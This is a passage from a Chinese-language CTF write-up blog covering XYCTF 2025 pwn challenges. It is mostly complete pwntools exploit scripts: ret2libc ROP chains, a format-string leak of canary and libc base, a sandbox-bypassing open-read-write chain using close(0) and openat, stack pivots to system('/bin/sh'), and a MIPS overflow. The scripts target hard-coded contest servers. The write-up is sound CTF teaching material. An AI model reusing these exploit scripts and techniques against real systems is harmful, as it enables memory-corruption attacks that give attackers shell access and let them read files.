class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"><span class="comment"># 这里的libc版本为Ubuntu GLIBC 2.35-0ubuntu3.9</span></span><br><span class="line">ip = <span class="string">&#x27;39.106.48.123:44314&#x27;</span></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line"><span class="comment"># bps = [0x040127A, 0x401261, 0x7ffff7c8aefd]</span></span><br><span class="line">bps = [<span class="number">0x040127A</span>]</span><br><span class="line"><span class="comment"># bps = []</span></span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x040127A ret</span></span><br><span class="line"><span class="string">b *0x00040122F          mov     eax, [rbp+var_4]</span></span><br><span class="line"><span class="string">0x7fffffffdc50 输入地址</span></span><br><span class="line"><span class="string">0x7fffffffde68: 0x0000000800000007</span></span><br><span class="line"><span class="string">0x7fffffffde68+0x4是v6地址,必须保证v6合理正确</span></span><br><span class="line"><span class="string">watch *(0x7fffffffded8)</span></span><br><span class="line"><span class="string">watch *(0x7fffffffdee8)</span></span><br><span class="line"><span class="string">0x7fffffffdef8 v6</span></span><br><span class="line"><span class="string">0x7fffffffdce0 输入地址</span></span><br><span class="line"><span class="string">x/30gx 0x7fffffffdec8</span></span><br><span class="line"><span class="string">watch *(0x405690)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">stdout_addr = <span class="number">0x404060</span></span><br><span class="line">mov_edi_esi_ret = <span class="number">0x0000000000401181</span><span class="comment">#: mov edi, esi; ret;</span></span><br><span class="line">add_rsi_rbp_ret = <span class="number">0x00000000004010eb</span><span class="comment">#: add rsi, qword ptr [rbp + 0x20]; ret;</span></span><br><span class="line">mov_rdi_rsi_ret = <span class="number">0x0000000000401180</span><span class="comment">#: mov rdi, rsi; ret;</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x000000000040117d</span><span class="comment">#: pop rbp; ret;</span></span><br><span class="line">mov_rdi_rax_call_ret = <span class="number">0x00000000004011f0</span> <span class="comment">#: mov rdi, rax; call 0x10a0; mov eax, 0; pop rbp; ret;</span></span><br><span class="line">xor_rdi_and_rsi_ret = <span class="number">0x00000000004010e0</span><span class="comment">#: xor rdi, rdi; nop; and rsi, 0; ret;</span></span><br><span class="line">load_puts = <span class="number">0x400600</span></span><br><span class="line">puts_str = <span class="number">0x40128D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">528</span>+<span class="number">12</span>)</span><br><span class="line"><span class="comment"># payload += p8(0x20) # 这里0x20恰好后面可以覆盖rbp</span></span><br><span class="line">payload += p8(<span class="number">0x28</span>) <span class="comment"># 这里0x28恰好后面可以覆盖rip</span></span><br><span class="line">payload += p64(puts_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里本地和远程的缓冲区大小不一样，所以循环的次数也不一样</span></span><br><span class="line"><span class="comment"># for i in range(214): </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>):</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">528</span>+<span class="number">12</span>)</span><br><span class="line"><span class="comment"># payload += p8(0x20) # 这里0x20恰好后面可以覆盖rbp</span></span><br><span class="line">payload2 += p8(<span class="number">0x28</span>) <span class="comment"># 这里0x28恰好后面可以覆盖rip</span></span><br><span class="line">payload2 += p64(xor_rdi_and_rsi_ret)</span><br><span class="line">payload2 += p64(pop_rbp_ret)</span><br><span class="line">payload2 += p64(load_puts-<span class="number">0x20</span>)</span><br><span class="line">payload2 += p64(add_rsi_rbp_ret)</span><br><span class="line">payload2 += p64(mov_rdi_rsi_ret)</span><br><span class="line">payload2 += p64(puts_plt)</span><br><span class="line">payload2 += p64(xor_rdi_and_rsi_ret)</span><br><span class="line">payload2 += p64(pop_rbp_ret)</span><br><span class="line">payload2 += p64(load_puts-<span class="number">0x20</span>)</span><br><span class="line">payload2 += p64(add_rsi_rbp_ret)</span><br><span class="line">payload2 += p64(mov_rdi_rsi_ret)</span><br><span class="line">payload2 += p64(puts_plt)</span><br><span class="line">payload2 += p64(xor_rdi_and_rsi_ret)</span><br><span class="line">payload2 += p64(pop_rbp_ret)</span><br><span class="line">payload2 += p64(load_puts-<span class="number">0x20</span>)</span><br><span class="line">payload2 += p64(add_rsi_rbp_ret)</span><br><span class="line">payload2 += p64(mov_rdi_rsi_ret)</span><br><span class="line">payload2 += p64(puts_plt)</span><br><span class="line">payload2 += p64(puts_str)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(215):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">53</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Ret2libc&#x27;s Revenge\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = uu64()</span><br><span class="line">leak(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># one = [0xebd43, 0xebd3f, 0xebd38, 0xebce2, 0xebc88, 0xebc85]</span></span><br><span class="line"><span class="comment"># one_gadget = libc_base + one[5]</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"><span class="comment"># leak(&#x27;one_gadget&#x27;)</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000f7493</span><span class="comment">#: ret;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, 1)</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">528</span>+<span class="number">12</span>)</span><br><span class="line"><span class="comment"># payload += p8(0x20) # 这里0x20恰好后面可以覆盖rbp</span></span><br><span class="line">payload3 += p8(<span class="number">0x28</span>) <span class="comment"># 这里0x28恰好后面可以覆盖rip</span></span><br><span class="line">payload3 += p64(pop_rdi_ret)</span><br><span class="line">payload3 += p64(binsh_addr)</span><br><span class="line">payload3 += p64(ret)</span><br><span class="line">payload3 += p64(system_addr)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025XYCTFpwn-wp/6.png"></p><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a><strong>girlfriend</strong></h3><p>也是保护全开<br><img src="/../picture/2025XYCTFpwn-wp/7.png"><br>同时开启了<code>sandbox保护</code>，不允许使用<code>open</code>(所以我们可以使用<code>openat</code>来代替<code>open</code>)<br>并且这里可以看出<code>read函数</code>的<code>第一个参数必须为0</code>,而我们知道我们一般打开文件读取文件中的内容一般<code>read</code>的<code>第一个参数是3</code>，而这里绕过的方法其实也很简单，我们在使用<code>openat</code>之前使用一个<code>close(0)</code>就可以<code>关闭标准输入流</code>，等我们使用<code>openat</code>打开<code>flag文件</code>的时候就会被默认为是<code>0</code>，此时<code>read(0,x,x)</code>就是读取文件中的内容<br><img src="/../picture/2025XYCTFpwn-wp/8.png"></p><p>大致程序如下，不过多介绍，大家可以自己下载附件查看<br><img src="/../picture/2025XYCTFpwn-wp/9.png"></p><p>选项3 有<code>格式化字符串漏洞</code>，可以用用于<code>泄露各种地址</code>以及<code>canary</code><br>选项1 有16字节的溢出，可以用于<code>栈迁移</code>，但是有次数限制只有一次<br>所以我的思路大致就是第一次先利用<code>格式化字符串漏洞</code>泄露<code>程序基地址</code>，<code>canary</code>，<code>libc基地址</code>，第二次也是选择进入<code>格式化字符串的选项</code>中但是不是为了使用<code>格式化字符串漏洞</code>而是为了在这个<code>bss段</code>布置<code>ROP链</code>来打<code>ORW</code>(这里需要注意，前面0x38字节最好不要布置ROP链，因为可能会覆盖掉重要的全局变量，导致后面的栈迁移无法使用，如下图所示)，<br><img src="/../picture/2025XYCTFpwn-wp/10.png"><br>然后第三次就是栈迁移了</p><p>具体exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./girlfriend&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"><span class="comment"># 这里的libc版本为Ubuntu GLIBC 2.35-0ubuntu3.9</span></span><br><span class="line">ip = <span class="string">&#x27;47.93.96.189:22535&#x27;</span></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line">menu = <span class="string">&quot;Your Choice:\n&quot;</span>  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">talk_her</span>(<span class="params">content</span>):  <span class="comment"># 只有一次机会</span></span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line">    sda(<span class="string">&quot;what do you want to say to her?&quot;</span>, content)  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">comment</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sda(<span class="string">&quot;You should tell her your name first&quot;</span>, comment)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;your name:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">canary_offset = <span class="number">15</span></span><br><span class="line">libc_offset = <span class="number">17</span></span><br><span class="line">elf_offset = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 1: leak canary, libc_base, elf_base</span></span><br><span class="line">get_name(<span class="string">&quot;%15$p_%17$p_%7$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x29D90</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x18D9</span></span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;elf_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf_base + <span class="number">0x004060</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000130202</span><span class="comment">#: pop rsi; ret;</span></span><br><span class="line">pop_rdx_r_ret = libc_base + <span class="number">0x000000000011f2e7</span><span class="comment">#: pop rdx; pop r12; ret;</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span><span class="comment">#: pop rax; ret;</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x000000000003d1ee</span><span class="comment">#: pop rcx; ret;</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span><span class="comment">#: syscall; ret;</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span><span class="comment">#: leave; ret;</span></span><br><span class="line">opnat_addr = libc_base + libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_addr = libc_base + libc.sym[<span class="string">&#x27;close&#x27;</span>]  </span><br><span class="line"></span><br><span class="line">rop2 = flat([</span><br><span class="line">    pop_rdi_ret, <span class="number">0</span>,</span><br><span class="line">    close_addr,</span><br><span class="line">    pop_rdi_ret, -<span class="number">100</span>,</span><br><span class="line">    pop_rsi_ret, bss_addr,</span><br><span class="line">    pop_rdx_r_ret, <span class="number">0x0</span>, <span class="number">0</span>,</span><br><span class="line">    opnat_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdx_r_ret, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">    read_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdx_r_ret, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    write_addr,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put(<span class="built_in">hex</span>(<span class="built_in">len</span>(rop2)))</span><br><span class="line"></span><br><span class="line">rop1 = flat([</span><br><span class="line">    <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">put(<span class="built_in">hex</span>(<span class="built_in">len</span>(rop1)))</span><br><span class="line"></span><br><span class="line">rop = rop1 + rop2</span><br><span class="line">put(<span class="built_in">hex</span>(<span class="built_in">len</span>(rop)))</span><br><span class="line"></span><br><span class="line">get_name(rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, 1)</span></span><br><span class="line"><span class="comment"># x/30gx $rebase(0x04060)</span></span><br><span class="line"><span class="comment"># x/30gx $rebase(0x04094)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(bss_addr+<span class="number">0x30</span>) + p64(leave_ret)</span><br><span class="line">talk_her(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025XYCTFpwn-wp/11.png"></p><h3 id="明日方舟寻访模拟器"><a href="#明日方舟寻访模拟器" class="headerlink" title="明日方舟寻访模拟器"></a><strong>明日方舟寻访模拟器</strong></h3><p>康康保护,发现没有<code>canary</code>和<code>PIE</code><br><img src="/../picture/2025XYCTFpwn-wp/12.png"><br>漏洞点在抽完之后退出可以向好友炫耀，炫耀的时候会让用户输入名字，这里存在read的溢出<br><img src="/../picture/2025XYCTFpwn-wp/13.png"></p><p>整个题目总体比较常规，第一次利用溢出控制<code>rbp寄存器</code>因为通过观察我们可以发现控制<code>rbp寄存器</code>就可以控制<code>read函数的输入地址</code><br><img src="/../picture/2025XYCTFpwn-wp/14.png"><br>这里我们第一次用溢出修改<code>rbp寄存器的值</code>然后返回到图中所示位置再次使用read<br>第二次让read函数在我们指定的位置(<code>bss段</code>)打入一个ROP，并且我们再次控制<code>rbp寄存器</code>进行栈迁移就可以获得shell<br>但是我们还需要注意，在程序的最后又一个<code>close(1)</code>，也就是哪怕我们拿到shell也没有办法让内容输出到终端上，所以我们还需要使用 <code>exec 1&gt;&amp;2</code> 这个指令<code>将标准输出重定向到标准错误中</code></p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./arknights&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;8.147.132.32:36781&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x04018B9</span>, <span class="number">0x40191C</span>, <span class="number">0x4018b9</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x0000000000401393</span><span class="comment">#: leave; ret;</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004018e5</span><span class="comment">#: pop rdi; ret</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401981</span><span class="comment">#: pop rsi; pop r15; ret;</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span><span class="comment">#: ret;</span></span><br><span class="line">bss_addr = <span class="number">0x405000</span> + <span class="number">0xd00</span><span class="comment">#: bss</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">call_read = <span class="number">0x4018A8</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;欢迎使用明日方舟寻访模拟器！祝你好运~\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;&#x27;</span>) <span class="comment"># 随便输入一个吧</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;请选择：[1]单抽 [2]十连 [3]自定义数量 [4]结束抽卡\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 单抽</span></span><br><span class="line">io.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;请选择：[1]单抽 [2]十连 [3]自定义数量 [4]结束抽卡\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>) <span class="comment"># 结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, 1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;请选择：[1]向好友炫耀 [2]退出\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 这里选择1 就存在溢出了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(0, bps, 1)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;请输入你的名字：&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(bss_addr + <span class="number">0x40</span>) <span class="comment"># rbp-0x40等于第二次read的输入地址</span></span><br><span class="line">payload += p64(call_read)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x405d00 第二次read的输入地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x405d00</span></span><br><span class="line">rop_chain = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">rop_chain += p64(ret) <span class="comment">#5F C3 0x4018e6 (main+446) ◂— ret</span></span><br><span class="line">rop_chain += p64(pop_rdi_ret)</span><br><span class="line">rop_chain += p64(binsh_addr)</span><br><span class="line">rop_chain += p64(system_addr)</span><br><span class="line">  </span><br><span class="line">payload = rop_chain.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr) <span class="comment"># 这里是栈迁移控制rbp</span></span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后还需要使用下面这个指令来重定向标准输出</span></span><br><span class="line"><span class="comment"># exec 1&gt;&amp;2</span></span><br></pre></td></tr></table></figure><p><img src="/../picture/2025XYCTFpwn-wp/15.png"></p><h3 id="Ez3-0"><a href="#Ez3-0" class="headerlink" title="Ez3.0"></a>Ez3.0</h3><p><a href="https://xz.aliyun.com/news/15999?time__1311=n4fxBDnDgDR7DQGk+D/zWiQreSoa7eheO4D&u_atoken=d07c29033b7e3b32994dafeacc496e49&u_asig=1a0c39d417440079159262611e0089">深入异构 PWN：PowerPC&amp;ARM&amp;MIPS-先知社区</a><br>这题和上面博客中的<code>split</code>基本上一致</p><p>就是很普通的栈溢出，不过是mipsel架构<br>需要了解一些<code>mips架构</code>的基本的指令和用法<br><img src="/../picture/2025XYCTFpwn-wp/16.png"><br><img src="/../picture/2025XYCTFpwn-wp/17.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>, <span class="string">&quot;./EZ3.0&quot;</span>])</span><br><span class="line"><span class="comment"># io = process([&quot;qemu-mipsel&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu&quot;, &quot;-g&quot;, &quot;12345&quot;, &quot;./EZ3.0&quot;])</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./EZ3.0&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/usr/mipsel-linux-gnu&quot;)</span></span><br><span class="line"></span><br><span class="line">binsh_cat = <span class="number">0x0411010</span> <span class="comment"># /bin/cat flag.txt</span></span><br><span class="line">lw_a0_8sp = <span class="number">0x00400a20</span><span class="comment">#: lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;</span></span><br><span class="line">system_addr = <span class="number">0x00400B70</span> <span class="comment"># system</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(target=(&quot;localhost&quot;, 12345), exe=elf.path, gdbscript=&quot;b *0x04008E0\nb *0x04009B4&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">36</span></span><br><span class="line">payload += p32(lw_a0_8sp)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(binsh_cat)</span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025XYCTFpwn-wp/18.png"></p><h3 id="heap2"><a href="#heap2" class="headerlink" title="heap2"></a>heap2</h3><p>一个有点怪怪的题目，本地可以<code>ORW</code>拿到<code>flag</code>，但是远程就是不行(后续如果拿到远程docker文件会尝试探索一下为什么，发现原因的话会更新这篇文章)，泪目<br>由于程序开启了沙箱保护，所以在bins中残留了非常多的堆块<br><img src="/../picture/2025XYCTFpwn-wp/19.png"><br><img src="/../picture/2025XYCTFpwn-wp/20.png"><br>而题目的漏洞点在于free的时候存在<code>UAF</code><br><img 